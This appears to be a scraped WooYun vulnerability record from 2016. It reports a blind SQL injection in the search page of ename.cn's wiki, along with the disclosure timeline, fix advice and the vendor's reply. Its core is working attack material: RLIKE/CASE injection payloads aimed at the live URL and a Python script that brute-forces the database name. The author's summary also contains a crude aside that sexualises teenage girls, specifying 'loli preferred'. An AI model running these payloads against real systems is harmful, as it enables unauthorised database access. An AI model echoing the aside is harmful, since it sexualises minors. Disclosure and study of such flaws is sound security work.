{"id": 87481, "wybug_id": "wooyun-2016-0198928", "wybug_title": "域名商安全之易名中国某站SQL注入（附验证脚本）                                      ", "wybug_corp": "易名中国", "wybug_author": "路人甲", "wybug_date": "2016-04-21 16:15", "wybug_open_date": "2016-06-06 09:20", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-05-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-06：\t细节向公众公开  简要描述： 本来shell了，你们居然下线了那个域名，我X！日本地震了 ，大家一副事不关己的样子 说句实话 着实令人心寒 本人出于人道主义，愿意收留1~5名日本孤儿，要求:女，15—19岁，身无划痕，身材黄金比例S，脸蛋洁白，萝莉优先…大爱无疆，人间有真情！再苦不能苦灾民！传递正能量，如果没有。那我等等在问一遍 详细说明：  \n返回错误http://wiki.ename.cn/doc/searchdata : keyword=1\") RLIKE (SELECT (CASE WHEN (substring(database(),1,1)='x') THEN \"1\" ELSE 0x28 END)) AND (\"oElH\"=\"oElH\n\n\n\n返回正确http://wiki.ename.cn/doc/searchdata : keyword=1\") RLIKE (SELECT (CASE WHEN (substring(database(),1,1)='e') THEN \"1\" ELSE 0x28 END)) AND (\"oElH\"=\"oElH\n\n\n   漏洞证明：  \n当前数据库名称为：ename_wiki\n\n\n\n#-*- coding:utf-8 -*-import requestspayload = list('einam_wk') #别问我怎么知道payload就这点...因为我跑了之后精简的url = 'http://wiki.ename.cn/doc/search'headers = {\t'Content-Type':'application/x-www-form-urlencoded',\t'Host':'wiki.ename.cn',\t'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko)'}database = ''for x in range(1,11):\tfor y in payload:\t\t\t\tdata = 'keyword=1\") RLIKE (SELECT (CASE WHEN (substring(database(),%d,1)=\"%s\") THEN \"1\" ELSE 0x28 END)) AND (\"oElH\"=\"oElH' % (x,y)\t\ttry:\t\t\tresponse = requests.post(url,data=data,headers=headers,verify=False,timeout=2)\t\t\tif(len(response.content) > 20000):\t\t\t\tprint u'[Tangscan] 数据库第'+repr(x)+u'位是'+y\t\t\t\tdatabase += y\t\texcept Exception,e:\t\t\tpassprint database\n   修复方案：  1.过滤转义双引号；2.检查线上数据是否受到影响（比如说拖库之类的）3.认真查看系统日志以及Mysql日志，定期对员工进行安全培训。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2016-04-22 09:17 厂商回复： 谢谢您的反馈，我们已经修复这个问题，会影响百科的资料，不涉及用户的资料。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-04-22 10:14 |    \t\t#6c6c6c \t\t\t( 普通白帽子  |\t\t\t        Rank:301 漏洞数:52        | 像一条狗孤独的活着，渴望的活着，绝望的活...)\t\t \n  @易名中国 不客气    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}